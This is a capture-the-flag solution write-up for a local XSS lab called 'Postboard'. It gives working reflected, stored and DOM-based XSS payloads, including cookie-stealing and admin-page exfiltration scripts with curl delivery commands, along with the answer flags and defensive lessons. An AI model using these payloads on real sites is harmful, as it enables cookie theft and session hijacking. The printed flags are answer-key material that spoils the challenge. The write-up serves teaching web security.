# 🚩 Postboard — SOLUTION (SPOILERS)

> ⛔⛔⛔ **STOP.** Full answers to all three flags below. Close this if you're still
> solving. Kept as a personal write-up, not to read while playing.
>
> .
>
> .
>
> .
>
> .
>
> .
>
> .

---

## Flag 1 — Reflected XSS → cookie theft (`FLAG{r3fl3ct3d_x55_c00k13_th13f}`)

`/search?q=` reflects `q` into the page unencoded, so a `<script>` in the query runs on
load. In *your* browser that's just a self-alert — the flag lives in the **moderator's**
cookie, so you have to make the mod's browser run it. That's what `/report` is for.

**Prove the sink** in your own browser first:

```
http://localhost:8087/search?q=<script>alert(document.domain)</script>
```

**Build the cookie-stealer.** The mod's `moderator_token` cookie is not httpOnly, so
`document.cookie` can read it. Beacon it to your collector:

```html
<script>new Image().src='/collect?c='+encodeURIComponent(document.cookie)</script>
```

URL-encoded as a `q` value (this is the path you report to the mod):

```
/search?q=<script>new%20Image().src='/collect?c='%2BencodeURIComponent(document.cookie)</script>
```

**Deliver it.** Go to `/report` and submit that path (same-origin, starts with `/`).
The bot opens it in the moderator's session within ~5s. Then open `/collector`:

```
moderator_token=FLAG{r3fl3ct3d_x55_c00k13_th13f}
```

curl version of the delivery (report the crafted path):

```bash
curl -s -X POST http://localhost:8087/report \
  --data-urlencode "url=/search?q=<script>new Image().src='/collect?c='+encodeURIComponent(document.cookie)</script>"
# wait ~6s for the bot, then:
curl -s http://localhost:8087/collector | grep FLAG
```

**Lesson:** two bugs compound here. (1) The reflection has no output encoding — Jinja
auto-escape (or `escape()`) on `q` kills it. (2) A secret sat in a **non-httpOnly**
cookie, so script could read it. Session/secret cookies must be `HttpOnly`.

## Flag 2 — Stored XSS → session riding (`FLAG{st0r3d_x55_r1d3s_th3_s3ss10n}`)

`/board` renders each note's name + message unescaped, and the moderator auto-reviews
the board on a timer — so a **stored** payload comes to the victim on its own, no report
needed.

The mod's real session cookie (`sid`) **is** httpOnly, so you can't steal it with
`document.cookie`. You don't need to. Inside the mod's browser your JS is same-origin
with the site, and `fetch()` sends their cookies for you — so just read the
moderators-only page and exfiltrate its body:

```html
<script>
fetch('/admin')
  .then(r => r.text())
  .then(t => { new Image().src = '/collect?c=' + encodeURIComponent(t); });
</script>
```

**Post it** as a board note (the message field):

```bash
curl -s -X POST http://localhost:8087/board \
  --data-urlencode "author=totally_normal" \
  --data-urlencode "message=<script>fetch('/admin').then(r=>r.text()).then(t=>{new Image().src='/collect?c='+encodeURIComponent(t)})</script>"
# wait ~6s for the mod's review cycle, then:
curl -s http://localhost:8087/collector | grep -o 'FLAG{[^}]*}'
```

The exfiltrated `/admin` HTML (URL-encoded on the collector) contains:

```
FLAG{st0r3d_x55_r1d3s_th3_s3ss10n}
```

**Lesson:** `HttpOnly` stops cookie *theft* but not session *riding* — an attacker
running in the victim's origin can still act as them via `fetch`/`XHR`. Defence in depth:
output-encode the stored notes (kills the XSS at the source), and don't rely on
`HttpOnly` alone (add a CSP, anti-CSRF where relevant, least-privilege on `/admin`).

## Flag 3 — DOM-based XSS (`FLAG{d0m_x55_1nn3rHTML_s1nk}`)

`/widget` runs, client-side:

```js
var params = new URLSearchParams(location.hash.slice(1));
var name = params.get('name') || 'friend';
document.getElementById('greeting').innerHTML = 'Hi, ' + name + '!';
```

The `#hash` never reaches the server (browsers don't send fragments) — this is pure DOM
XSS. A bare `<script>` assigned via `innerHTML` does **not** execute, so use a mark that
fires a handler on insertion, e.g. an image error:

```
http://localhost:8087/widget#name=<img src=x onerror=alert(reveal())>
```

`reveal()` is already defined on the page (it returns the flag from XOR-obfuscated
char codes). Your `onerror` fires, calls it, and the alert prints:

```
FLAG{d0m_x55_1nn3rHTML_s1nk}
```

Prefer the console? `#name=<img src=x onerror=document.title=reveal()>` or read it in
DevTools. (Purist note: because `reveal()` lives in client source you *could* reverse
the XOR by hand — but the objective is recognising the sink and achieving execution,
which the `onerror` does.)

**Lesson:** DOM XSS is a **client-side** bug — server-side escaping can't help. The fix
is at the sink: use `textContent`/`innerText` instead of `innerHTML`, or sanitise
(DOMPurify) before inserting. Treat `location.hash`/`search`/`referrer` as untrusted.

---

### Full flag list
1. `FLAG{r3fl3ct3d_x55_c00k13_th13f}`    — reflected XSS, non-httpOnly cookie theft
2. `FLAG{st0r3d_x55_r1d3s_th3_s3ss10n}`  — stored XSS, ride the httpOnly session via fetch
3. `FLAG{d0m_x55_1nn3rHTML_s1nk}`        — DOM XSS, hash → innerHTML, call reveal()

### The one fix that kills all three
Never build markup by concatenating untrusted input. Server side: rely on
auto-escaping / `escape()` for every reflection and every stored field. Client side:
`textContent` not `innerHTML` (or sanitise). Then defence in depth: `HttpOnly` +
`Secure` on session cookies, and a restrictive `Content-Security-Policy` so an injected
`<script>`/beacon has nowhere to run or phone home.
